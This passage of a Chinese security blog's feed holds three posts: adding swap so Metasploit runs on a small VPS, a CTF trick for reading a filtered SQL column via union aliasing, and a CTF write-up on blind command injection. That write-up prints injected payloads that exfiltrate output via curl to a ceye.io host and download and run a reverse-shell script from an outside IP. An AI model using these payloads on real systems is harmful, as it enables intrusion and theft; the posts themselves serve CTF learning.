class="line">from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2027:in `_rl_init_terminal_io&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2564:in `readline_initialize_everything&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:3849:in `rl_initialize&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4868:in `readline&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:100:in `pgets&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:375:in `get_input_line&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:191:in `run&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start&apos;</span><br><span class="line">from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start&apos;</span><br></pre></td></tr></table></figure></p><p>内存不足，一直没有好的解决方案。最近看Linux的时候，看到Swap分区，想到一个解决方案</p><h2 id="0x01-解决方案"><a href="#0x01-解决方案" class="headerlink" title="0x01 解决方案"></a>0x01 解决方案</h2><p>vps默认安装的时候是没有安装swap分区的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@daiker ~]# top</span><br><span class="line">top - 06:35:36 up 14:57,  2 users,  load average: 0.21, 0.09, 0.07</span><br><span class="line">Tasks:  86 total,   1 running,  85 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.5 us,  0.0 sy,  0.0 ni, 99.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :  1016108 total,   240924 free,   518952 used,   256232 buff/cache</span><br><span class="line">KiB Swap:        0 total,        0 free,        0 used.   247996 avail Mem</span><br></pre></td></tr></table></figure></p><p>我们可以给分配一个swap分区,命令如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/zero of=/home/swap bs=1024 count=512000</span><br><span class="line">/sbin/mkswap /home/swap</span><br><span class="line">/sbin/swapon /home/swap</span><br></pre></td></tr></table></figure><p>然后查看swap分区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@daiker ~]# free -h</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           992M        506M         74M         92M        411M        242M</span><br><span class="line">Swap:          499M          0B        499M</span><br></pre></td></tr></table></figure></p><p>msf成功开启</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-问题&quot;&gt;&lt;a href=&quot;#0x00-问题&quot; class=&quot;headerlink&quot; title=&quot;0x00 问题&quot;&gt;&lt;/a&gt;0x00 问题&lt;/h2&gt;&lt;p&gt;在vps里面跑msf，经常遇到内存不足，提示如下&lt;br&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="工具使用" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="Linux" scheme="http://www.daikersec.com/tags/Linux/"/>
    
      <category term="Kali" scheme="http://www.daikersec.com/tags/Kali/"/>
    
      <category term="tools" scheme="http://www.daikersec.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>CTF中SQL注入字段名被过滤小技巧</title>
    <link href="http://www.daikersec.com/wiki/a62e54a0.html"/>
    <id>http://www.daikersec.com/wiki/a62e54a0.html</id>
    <published>2018-03-12T03:04:07.000Z</published>
    <updated>2018-05-21T03:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来</p><h1 id="0x01-问题引入"><a href="#0x01-问题引入" class="headerlink" title="0x01 问题引入"></a>0x01 问题引入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+--------+-----------+</span><br><span class="line">| points | flag      |</span><br><span class="line">+--------+-----------+</span><br><span class="line">| 31     | daiker666 |</span><br><span class="line">+--------+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。<br><a id="more"></a></p><h1 id="0x02-问题思考"><a href="#0x02-问题思考" class="headerlink" title="0x02 问题思考"></a>0x02 问题思考</h1><p>常规的查询是<code>select flag from users</code>,如果我要在们的查询语句中不见到<code>flag</code>，就得把<code>flag</code>这个列设置别名，mysql设置列别名有两种方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select flag as haha from users;</span><br><span class="line">+-----------+</span><br><span class="line">| haha      |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (flag)haha from users;</span><br><span class="line">+-----------+</span><br><span class="line">| haha      |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>但是这样我们还会出现flag这个字段。这时候想到这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1;</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1,2;</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>这样列名不久变成我们想要的结果，然而我们想要的结果是users表的内容，我们可以使用联合查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2 union select * from users;</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">| 31   | daiker666 |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure></p><p>这样我们想要的值就在表里面，，下面思考下怎么提取出来，查询的结果是一张虚表，我们可以用设置别名的方法给这张表命名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select 1,2 union select * from users)c;</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">| 31   | daiker666 |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure></p><p>然后提取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select c.2 from (select 1,2 union select * from users)c limit 1,2;</span><br><span class="line">+-----------+</span><br><span class="line">| 2         |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来&lt;/p&gt;
&lt;h1 id=&quot;0x01-问题引入&quot;&gt;&lt;a href=&quot;#0x01-问题引入&quot; class=&quot;headerlink&quot; title=&quot;0x01 问题引入&quot;&gt;&lt;/a&gt;0x01 问题引入&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; select * from users;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+--------+-----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| points | flag      |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+--------+-----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| 31     | daiker666 |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+--------+-----------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1 row in set (0.00 sec)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。&lt;br&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Web安全" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SQL注入" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="CTF" scheme="http://www.daikersec.com/tags/CTF/"/>
    
      <category term="注入" scheme="http://www.daikersec.com/tags/%E6%B3%A8%E5%85%A5/"/>
    
      <category term="web" scheme="http://www.daikersec.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>happyMoctf-ping一下好吗WP</title>
    <link href="http://www.daikersec.com/wiki/8f0228b2.html"/>
    <id>http://www.daikersec.com/wiki/8f0228b2.html</id>
    <published>2018-02-15T10:39:15.000Z</published>
    <updated>2018-05-21T03:03:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过<code>DNS通道/HTTP通道</code>和<code>反弹shell</code>。</p><h1 id="0x01-DNS通道-HTTP通道"><a href="#0x01-DNS通道-HTTP通道" class="headerlink" title="0x01 DNS通道/HTTP通道"></a>0x01 DNS通道/HTTP通道</h1><p>post ip=0.0.0.0|curl ***.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)<br><img src="http://upload-images.jianshu.io/upload_images/5443560-c408e1c41f14c7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><a id="more"></a><br>执行<code>ls|base64</code>(要经过base64编码是因为有一些不可打印字符和空格)解码后可以看到<br><img src="http://upload-images.jianshu.io/upload_images/5443560-1e0c7759a04a3ad3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png">。<br>然后cat就可以读flag。这里面出了个小差错，<code>&lt;?php</code>后面忘记加空格，导致直接访问查看源码可以直接看到flag。说个好玩的，我13号早上把flag文件名的名字改了，然后晚上查看日志的时候居然发现几个ip在直接访问旧的flag文件名。<br><img src="http://upload-images.jianshu.io/upload_images/5443560-0d402cd5889e2bc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>dns类似，直接post `command`.xx.ceye.io就可以</p><h1 id="0x02-反弹shell"><a href="#0x02-反弹shell" class="headerlink" title="0x02 反弹shell"></a>0x02 反弹shell</h1><p>由于直接反弹shell的命令几乎都会触发waf，所以可以先把执行shell的命令保存到本地，再执行。这里面不存在wget，只能利用curl。<code>-</code>被禁了，不能通过-o来保存到文件，可以通过<code>&gt;</code>。写到/tmp底下执行<br>post ip=0.0.0.0|curl 139.199.2.226:6666/1 &gt;/tmp/1<br><img src="http://upload-images.jianshu.io/upload_images/5443560-c8eecae75ecda861.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后本机监听8080端口<br><img src="http://upload-images.jianshu.io/upload_images/5443560-bb7e6e0b6aaebf0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><p>post ip=0.0.0.0|/chmod +x tmp/1<br>添加执行权限<br>post ip=0.0.0.0|/tmp/1<br>反弹成功<br><img src="http://upload-images.jianshu.io/upload_images/5443560-798bfb8dbf456659.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过&lt;code&gt;DNS通道/HTTP通道&lt;/code&gt;和&lt;code&gt;反弹shell&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&quot;0x01-DNS通道-HTTP通道&quot;&gt;&lt;a href=&quot;#0x01-DNS通道-HTTP通道&quot; class=&quot;headerlink&quot; title=&quot;0x01 DNS通道/HTTP通道&quot;&gt;&lt;/a&gt;0x01 DNS通道/HTTP通道&lt;/h1&gt;&lt;p&gt;post ip=0.0.0.0|curl ***.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)&lt;br&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/5443560-c408e1c41f14c7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;图片.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Web安全" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="命令执行" scheme="http://www.daikersec.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="ctf" scheme="http://www.daikersec.com/tags/ctf/"/>
    
      <category term="Web" scheme="http://www.daikersec.com/tags/Web/"/>
    
      <category term="漏洞研究" scheme="http://www.daikersec.com/tags/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
</feed>
